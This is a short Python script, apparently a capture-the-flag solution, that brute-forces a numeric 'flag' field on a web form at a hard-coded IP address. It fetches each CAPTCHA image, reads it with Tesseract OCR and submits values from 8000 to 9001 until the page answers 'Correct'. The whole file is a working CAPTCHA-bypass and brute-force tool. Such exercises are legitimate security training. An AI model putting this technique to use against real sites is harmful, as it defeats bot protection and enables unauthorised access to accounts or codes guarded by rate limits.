import requests
from PIL import Image
from io import BytesIO
import pytesseract
from bs4 import BeautifulSoup

# C1 : 1578
# C2: 2756

# URL for captcha retrieval and form submission
captcha_url = 'http://31.220.95.27:9002/captcha.php'
submit_url = 'http://31.220.95.27:9002/captcha5/'

Value_BruteForce = 8000
End_BruteForce = 9001
session = requests.Session()

init_response = session.post(submit_url)
init_content = init_response.text

while Value_BruteForce <= End_BruteForce:
    response = session.get(captcha_url)
    image = Image.open(BytesIO(response.content))
    
    captcha_text = pytesseract.image_to_string(image, config="-c tessedit_char_whitelist=0123456789 --psm 6")
    captcha_text = captcha_text.strip()
    
    if len(captcha_text) == 6:
        form_data = {
            'flag': Value_BruteForce,
            'captcha': captcha_text,
            'submit': 'Envoyer'
        }
        
        response = session.post(submit_url, data=form_data)
        print(f"Trying flag value: {Value_BruteForce}")
        print("Captcha Solved as:", captcha_text)
        
        if "Correct" in response.text:
            print(f"Correct flag found: {Value_BruteForce}")
            break

        Value_BruteForce += 1

# Close the session
session.close()
